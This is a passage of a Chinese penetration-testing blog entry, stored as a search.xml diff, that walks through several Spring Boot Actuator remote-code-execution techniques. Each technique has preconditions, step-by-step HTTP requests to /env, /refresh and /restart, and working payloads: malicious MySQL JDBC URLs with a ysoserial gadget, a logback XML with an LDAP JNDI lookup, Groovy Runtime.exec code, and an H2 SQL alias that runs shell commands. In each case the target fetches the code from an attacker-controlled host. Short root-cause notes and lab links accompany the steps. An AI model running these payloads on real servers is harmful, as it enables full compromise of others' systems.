+<h5 id="步骤六：发包触发-JNDI-注入"><a href="#步骤六：发包触发-JNDI-注入" class="headerlink" title="步骤六：发包触发 JNDI 注入"></a>步骤六：发包触发 JNDI 注入</h5><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞分析：-6"><a href="#漏洞分析：-6" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
+<h4 id="漏洞环境：-6"><a href="#漏洞环境：-6" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9096&#x2F;h2-console</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x08：mysql-jdbc-deserialization-RCE"><a href="#0x08：mysql-jdbc-deserialization-RCE" class="headerlink" title="0x08：mysql jdbc deserialization RCE"></a>0x08：mysql jdbc deserialization RCE</h3><h4 id="利用条件：-11"><a href="#利用条件：-11" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-11"><a href="#利用方法：-11" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h5><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
+<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
+<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
+<h5 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h5><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>
+
+<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
+<h5 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h5><blockquote>
+<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
+</blockquote>
+<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure>
+
+<p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure>
+
+
+
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url&#x3D;对应属性值</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h5><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
+<h5 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h5><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
+<h4 id="漏洞原理：-6"><a href="#漏洞原理：-6" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
+<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
+<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
+<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
+<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-7"><a href="#漏洞分析：-7" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
+<h4 id="漏洞环境：-7"><a href="#漏洞环境：-7" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><blockquote>
+<p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p>
+</blockquote>
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository/springboot-mysql-jdbc-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9097&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+<p>发送完 payload 后触发漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9097&#x2F;product&#x2F;list</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x09：restart-logging-config-logback-JNDI-RCE"><a href="#0x09：restart-logging-config-logback-JNDI-RCE" class="headerlink" title="0x09：restart logging.config logback JNDI RCE"></a>0x09：restart logging.config logback JNDI RCE</h3><h4 id="利用条件：-12"><a href="#利用条件：-12" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li>
+<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
+<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
+<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
+</ul>
+<h4 id="利用方法：-12"><a href="#利用方法：-12" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h5><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-7"><a href="#漏洞原理：-7" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
+<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
+<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
+<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
+<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析：-8"><a href="#漏洞分析：-8" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
+<p>​    <a href="https://landgrey.me/blog/21/">https://landgrey.me/blog/21/</a></p>
+<h4 id="漏洞环境：-8"><a href="#漏洞环境：-8" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x0A：restart-logging-config-groovy-RCE"><a href="#0x0A：restart-logging-config-groovy-RCE" class="headerlink" title="0x0A：restart logging.config groovy RCE"></a>0x0A：restart logging.config groovy RCE</h3><h4 id="利用条件：-13"><a href="#利用条件：-13" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
+<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
+<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
+</ul>
+<h4 id="利用方法：-13"><a href="#利用方法：-13" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件"><a href="#步骤一：托管-groovy-文件" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤二：设置-logging-config-属性"><a href="#步骤二：设置-logging-config-属性" class="headerlink" title="步骤二：设置 logging.config 属性"></a>步骤二：设置 logging.config 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：重启应用"><a href="#步骤三：重启应用" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-8"><a href="#漏洞原理：-8" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
+<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
+<li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li>
+<li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞环境：-9"><a href="#漏洞环境：-9" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x0B：restart-spring-main-sources-groovy-RCE"><a href="#0x0B：restart-spring-main-sources-groovy-RCE" class="headerlink" title="0x0B：restart spring.main.sources groovy RCE"></a>0x0B：restart spring.main.sources groovy RCE</h3><h4 id="利用条件：-14"><a href="#利用条件：-14" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
+<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
+<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
+</ul>
+<h4 id="利用方法：-14"><a href="#利用方法：-14" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件-1"><a href="#步骤一：托管-groovy-文件-1" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤二：设置-spring-main-sources-属性"><a href="#步骤二：设置-spring-main-sources-属性" class="headerlink" title="步骤二：设置 spring.main.sources 属性"></a>步骤二：设置 spring.main.sources 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：重启应用-1"><a href="#步骤三：重启应用-1" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-9"><a href="#漏洞原理：-9" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
+<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
+<li><code>spring-boot</code> 组件中的 <code>org.springframework.boot.BeanDefinitionLoader.java</code> 文件代码逻辑中会判断 url 是否以 <code>.groovy</code> 结尾</li>
+<li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞环境：-10"><a href="#漏洞环境：-10" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x0C：restart-spring-datasource-data-h2-database-RCE"><a href="#0x0C：restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="0x0C：restart spring.datasource.data h2 database RCE"></a>0x0C：restart spring.datasource.data h2 database RCE</h3><h4 id="利用条件：-15"><a href="#利用条件：-15" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
+<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
+<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
+</ul>
+<h4 id="利用方法：-15"><a href="#利用方法：-15" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-sql-文件"><a href="#步骤一：托管-sql-文件" class="headerlink" title="步骤一：托管 sql 文件"></a>步骤一：托管 sql 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
+<blockquote>
+<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤二：设置-spring-datasource-data-属性"><a href="#步骤二：设置-spring-datasource-data-属性" class="headerlink" title="步骤二：设置 spring.datasource.data 属性"></a>步骤二：设置 spring.datasource.data 属性</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：重启应用-2"><a href="#步骤三：重启应用-2" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理：-10"><a href="#漏洞原理：-10" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
+<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
+<li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞环境：-11"><a href="#漏洞环境：-11" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
 </search>
